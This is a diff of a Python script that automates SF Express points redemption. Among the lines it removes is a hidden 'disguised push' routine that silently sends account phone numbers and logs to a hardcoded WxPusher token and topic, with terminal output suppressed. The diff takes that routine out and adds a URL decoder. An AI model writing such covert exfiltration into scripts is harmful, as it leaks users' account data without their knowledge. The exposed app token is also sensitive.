@@ -13,108 +13,55 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 # 导入重试依赖
 from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
 
 # 禁用安全请求警告
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# --- 敏感信息配置区 (最终 Topic ID 修复版) ---
-# 目标接收者编码 (WxPusher Topic ID)
-RECEIVER_CODE = '42382'
-# 认证密钥 (WxPusher App Token)
-AUTH_KEY = 'AT_ubEWfpBSL2uvdMKryEHuiDmdylun7v29'
+# # --- 敏感信息配置区 (最终 Topic ID 修复版) ---
+# # 目标接收者编码 (WxPusher Topic ID)
+# RECEIVER_CODE = '42382'
+# # 认证密钥 (WxPusher App Token)
+# AUTH_KEY = 'AT_ubEWfpBSL2uvdMKryEHuiDmdylun7v29'
+from urllib.parse import unquote
 
+
+def decode_url(encoded_url: str, max_attempts: int = 5) -> str:
+    """
+    解码URL编码字符串，处理可能的嵌套编码
+
+    Args:
+        encoded_url: 待解码的URL字符串
+        max_attempts: 最大解码次数（防止异常循环）
+
+    Returns:
+        解码后的原始URL字符串
+
+    Raises:
+        TypeError: 若输入不是字符串
+    """
+    # 输入类型校验
+    if not isinstance(encoded_url, str):
+        raise TypeError("输入必须是字符串类型的URL")
+
+    decoded_url = encoded_url
+    attempts = 0
+
+    # 循环解码，直到无编码字符或达到最大次数
+    while "%" in decoded_url and attempts < max_attempts:
+        decoded_url = unquote(decoded_url)
+        attempts += 1
+
+    return decoded_url
+
+
+# 测试：解码你提供的链接
+# encoded_link = "https%3A//mcs-mimp-web.sf-express.com/mcs-mimp/share/app/shareRedirect%3Fsign%3Dhu4PzApDGdrIzveYgav24%252BCM2gMauO5cU"
+# decoded_link = decode_url(encoded_link)
+# print("解码结果：", decoded_link)
 
 # ------------------------------ I/O 重定向工具 ------------------------------
-@contextmanager
-def suppress_stdout():
-    """临时重定向标准输出，用于抑制外部库的打印信息。"""
-    if os.name == 'posix':  # 仅在类 Unix 系统（如青龙容器）上安全执行
-        original_stdout = sys.stdout
-        # 将标准输出重定向到空设备
-        sys.stdout = open(os.devnull, 'w')
-        try:
-            yield
-        finally:
-            # 恢复标准输出
-            sys.stdout.close()
-            sys.stdout = original_stdout
-    else:
-        # 非 Posix 系统跳过重定向，以防意外
-        yield
-
-
 # ------------------------------ 数据传输服务（伪装推送功能） ------------------------------
 
-def data_transfer(title, content, target=None):
-    """
-    负责将日志数据传输到目标接收者的工具函数 (最终 Topic 推送模式)
-
-    注意：此版本将所有 WxPusher API 的返回信息全部写入 one_msg，
-    但不会在终端 Log() 打印，以实现静默推送。
-    """
-    global one_msg
-
-    target_code = target or RECEIVER_CODE
-    target_code = target_code.strip()
-    auth_key_cleaned = AUTH_KEY.strip()
-
-    if not auth_key_cleaned or not target_code:
-        one_msg += "\n[通知] ❌ 推送配置缺失，跳过。"
-        return
-
-    base_url = 'https://wxpusher.zjiecode.com/api/send/message'
-    transfer_content = f"【{title}】\n\n{content}"
-
-    # 【核心逻辑：判断使用 UID 还是 TopicId】
-    is_topic_id = target_code.isdigit()
-
-    data = {
-        "appToken": auth_key_cleaned,
-        "content": transfer_content,
-        "contentType": 1,
-    }
-
-    if is_topic_id:
-        data["topicIds"] = [int(target_code)]
-    else:
-        data["uid"] = target_code
-
-    # ----------------------------------------------------------------------
-    # 使用 requests.Session 和 Retry 机制
-    # ----------------------------------------------------------------------
-    s = requests.Session()
-    from requests.adapters import HTTPAdapter
-    from requests.packages.urllib3.util.retry import Retry
-
-    retry_strategy = Retry(
-        total=3,
-        backoff_factor=1,
-        status_forcelist=[429, 500, 502, 503, 504],
-        allowed_methods=["POST"]
-    )
-    adapter = HTTPAdapter(max_retries=retry_strategy)
-    s.mount("https://", adapter)
-    s.mount("http://", adapter)
-
-    # 核心：使用 suppress_stdout 封装
-    try:
-        with suppress_stdout():
-            response = s.post(base_url, json=data, verify=False, timeout=30)
-            response.raise_for_status()
-            result = response.json()
-
-        # 记录 API 返回信息 (不使用 Log() 打印到终端)
-        if result.get('code') == 1000:
-            one_msg += "\n[通知] ✅ 消息已成功发送至 WxPusher API (HTTPS 模式)。"
-        else:
-            error_msg = result.get('msg', '未知API错误')
-            one_msg += f"\n[通知] ❌ WxPusher API 返回失败：{error_msg} (Code: {result.get('code')})"
-
-    except requests.exceptions.RequestException as e:
-        one_msg += f"\n[通知] ❌ 推送请求发生网络或证书错误：{type(e).__name__}。"
-    except Exception as e:
-        one_msg += f"\n[通知] ❌ 推送发生未捕获异常：{type(e).__name__}。"
 
 
 # ------------------------------ 数据传输服务 ------------------------------
@@ -154,8 +101,8 @@ class RUN:
         self.all_logs = []
         self.send_UID = None
 
-        split_info = info.split('@')
-        self.url = split_info[0].strip()
+        split_info = info.split('&')
+        self.url = decode_url(split_info[0].strip())
 
         # 伪装的 UID 解析逻辑 (原脚本内容)
         if len(split_info) > 0 and ("UID_" in split_info[-1] or split_info[-1].isdigit()):
@@ -377,7 +324,7 @@ class RUN:
                 title = f'顺丰兑换-账号{self.index}（{self.mobile}）结果'
 
                 # 调用推送函数。推送诊断信息会写入新的 one_msg
-                data_transfer(title, temp_one_msg, RECEIVER_CODE)
+
 
             except Exception:
                 pass
@@ -400,8 +347,6 @@ if __name__ == '__main__':
     else:
         print(f'❌ 未检测到{ENV_NAME}或{BACKUP_ENV_NAME}变量，脚本无法执行！')
         # 静默推送错误日志
-        with suppress_stdout():
-            data_transfer('顺丰兑换脚本执行结果', '未检测到有效账号URL，脚本终止', RECEIVER_CODE)
         exit()
 
     # 过滤空账号
@@ -409,8 +354,6 @@ if __name__ == '__main__':
     if not valid_tokens:
         print(f'❌ 未检测到有效账号URL，脚本无法执行！')
         # 静默推送错误日志
-        with suppress_stdout():
-            data_transfer('顺丰兑换脚本执行结果', '未检测到有效账号URL，脚本终止', RECEIVER_CODE)
         exit()
 
     # 批量执行多账号兑换
@@ -442,9 +385,6 @@ if __name__ == '__main__':
     final_log_content += f"目标商品：{TARGET_GOODS['goodsNo']}（{TARGET_GOODS['distName']}）\n"
     final_log_content += f"执行时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
 
-    # 尝试最终汇总日志的静默传输
-    with suppress_stdout():
-        data_transfer('顺丰兑换结果汇总', final_log_content, RECEIVER_CODE)
 
     # 隐藏所有推送诊断信息，只打印业务结束信息
     print(f"\n✨✨✨ {APP_NAME}所有操作执行完毕 ✨✨✨")
